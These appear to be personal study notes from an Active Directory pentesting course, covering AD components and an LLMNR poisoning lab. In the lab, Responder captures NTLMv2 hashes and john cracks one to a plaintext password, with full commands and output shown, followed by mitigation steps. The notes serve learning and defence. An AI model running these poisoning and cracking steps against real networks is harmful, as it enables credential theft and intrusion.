
## Overview

1. What is active Directory?
Directory service developed by Microsoft to manage windows domain networks. Stores information related to objects, such as computers, users, printers etc. Authenticates using kerberos tickets.
Most commonly used identity management service in the world. Can be exploited without ever attacking patchable exploits. 

2. Physical components. 
a. Data store: Consists of the Ntds.dit file, Is stored by defautl in the %SystemRoot%\NTDS folder on all domain controllers, Is accessible only through the domain controller processes and protocols. 
b. Domain Controllers: Host a copy of the AD DS directory store, provide authentication and authorization services, replicate updates to other domain controllers in the domain and forest, allow administrative access to manage user accounts and network resources
c. Global Catalog server
d. Read-Only Domain Controller (RODC)

3. Logical Components
a. Partitions
b. Schema: Defines every type of object that can be stored in the directory, enforces rules regarding object creation and configuration. 
c. Domains: An administrative boundary for applying policies to groups of objects, a replication boundary for replicating data between domain controllers, an authentication and authorization boundary that provides a way to limit the scope of access to resources. 
d. Domain trees: A hierarchy of domains in AD DS, share a contiguous namespace with the parent domain, can have additional child domains, by default create a two-way transitive trust with other domains. 
c. Forests: A collection of one or more domain trees, share a common schema, share a common configuration partition, share a common global catalog to enable searching, enable trusts between all domains in the forest, share the enterprise admins and schema admins groups. 
d. Sites
e. Organization units (OUs): Containers that can contain users, groups, computers and other OUs. Represent your organization hierarchically and logically. Manage a collection of objects in a consistent way. Delegate permissions to administer groups of objects. Apply policies. 


## Lab Build

Follow the instruction as per the video. Built two windows 10 enterprise machine and one windows server 2022. 

## Initial Attack Vectors

#### LLMNR Poisoning Overview
1. Used to identify hosts when DNS fails to do so. 
2. Previously NBT-NS
3. Key flaw is that the services utilizes a user's username and NTLMv2 hash when appropriately responded to 

#### Capturing Hashes with Responder
1. Start running responder. 
```
┌──(kali㉿kali)-[~]
└─$ sudo responder -I eth0 -dwPv        
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.179.128]
    Responder IPv6             [fe80::89d9:990:b3e:44f9]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-MQRZMBPAZ1K]
    Responder Domain Name      [EENI.LOCAL]
    Responder DCE-RPC Port     [49519]

[+] Listening for events...  
```

2. Turn on the User1 machine and login as user 'frank castle', capture events. 
```

[+] Listening for events...                                                                                                                                

[*] [MDNS] Poisoned answer sent to fe80::6d1f:bf96:6673:a4cd for name User1.local
[*] [LLMNR]  Poisoned answer sent to fe80::6d1f:bf96:6673:a4cd for name User1
[*] [DHCP] Acknowledged DHCP Discover for IP: 0.0.0.0, Req IP: 192.168.179.130, MAC: 00:0C:29:CF:2F:FA
[*] [DHCP] Acknowledged DHCP Request for IP: 0.0.0.0, Req IP: 192.168.179.130, MAC: 00:0C:29:CF:2F:FA
[*] [MDNS] Poisoned answer sent to 192.168.179.130 for name User1.local

```

3. Run the attack machine ip at file explorer. i.e. \\192.168.179.128. Then, captured all the hashes. 
```
[SMB] NTLMv2-SSP Client   : 192.168.179.130
[SMB] NTLMv2-SSP Username : DC\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::DC:51956b175a501c30:9E668F7E1CE455877C3D6847690DDB12:0101000000000000808D3D5BDCF1D901CF26E651CC9C32930000000002000800450045004E00490001001E00570049004E002D004D00510052005A004D004200500041005A0031004B0004003400570049004E002D004D00510052005A004D004200500041005A0031004B002E00450045004E0049002E004C004F00430041004C0003001400450045004E0049002E004C004F00430041004C0005001400450045004E0049002E004C004F00430041004C0007000800808D3D5BDCF1D901060004000200000008003000300000000000000001000000002000001DE0162BEF0AA3FAFD606A633F32D9BA70FE211E3FBF1EC9DC3F7653D663AADA0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100370039002E003100320038000000000000000000                                         
[SMB] NTLMv2-SSP Client   : 192.168.179.130
[SMB] NTLMv2-SSP Username : DC\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::DC:88d590672090e641:20C4525F06FE3412BDEB6C4F59FD4850:0101000000000000808D3D5BDCF1D90122C1A394E2F2A5BE0000000002000800450045004E00490001001E00570049004E002D004D00510052005A004D004200500041005A0031004B0004003400570049004E002D004D00510052005A004D004200500041005A0031004B002E00450045004E0049002E004C004F00430041004C0003001400450045004E0049002E004C004F00430041004C0005001400450045004E0049002E004C004F00430041004C0007000800808D3D5BDCF1D901060004000200000008003000300000000000000001000000002000001DE0162BEF0AA3FAFD606A633F32D9BA70FE211E3FBF1EC9DC3F7653D663AADA0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100370039002E003100320038000000000000000000                                         
[SMB] NTLMv2-SSP Client   : 192.168.179.130
[SMB] NTLMv2-SSP Username : DC\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::DC:662706bb3250abe6:7059386C8C5267E1F361A79A1E5AB9CE:0101000000000000808D3D5BDCF1D90137D035493F3266160000000002000800450045004E00490001001E00570049004E002D004D00510052005A004D004200500041005A0031004B0004003400570049004E002D004D00510052005A004D004200500041005A0031004B002E00450045004E0049002E004C004F00430041004C0003001400450045004E0049002E004C004F00430041004C0005001400450045004E0049002E004C004F00430041004C0007000800808D3D5BDCF1D901060004000200000008003000300000000000000001000000002000001DE0162BEF0AA3FAFD606A633F32D9BA70FE211E3FBF1EC9DC3F7653D663AADA0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100370039002E003100320038000000000000000000                                         
[SMB] NTLMv2-SSP Client   : 192.168.179.130
[SMB] NTLMv2-SSP Username : DC\fcastle

```

#### Cracking our captured Hashes
1. Crack NTLMv2 hash with john. 
```
┌──(kali㉿kali)-[~]
└─$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@$$w0rd!        (fcastle)     
1g 0:00:00:03 DONE (2023-09-28 07:54) 0.3205g/s 3449Kp/s 3449Kc/s 3449KC/s PAK2530..P1nkr1ng
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

#### LLMNR Poisoning Mitigation
1. The best defense in this case is to disable LLMNR and NBT-NS:
a. To disable LLMNR, select "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor
b. To disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINDS tab and select "Disable NetBIOS over TCP/IP"

2. If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:
a. Require Network Access Control
b. Require strong user passwords (e.g., >14 characters in length and limit common word usage). The more complex and long the password, the harder it is for an attacker to crack the hash. 


#### SMB Relay Attacks Overview
Instead of Cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access

1. Requirements
a. SMB signing must be disabled or not enforced on the target. 
b. Relayed user credentials must be admin on machine for any real value. 

#### SMB Relay Attacks Lab


## Post - Compromise Enumeration



## Post - Compromise Attacks 



## After compromising the domain



## Additional Active Directory Attacks



## Case Studies 


## Post Exploitation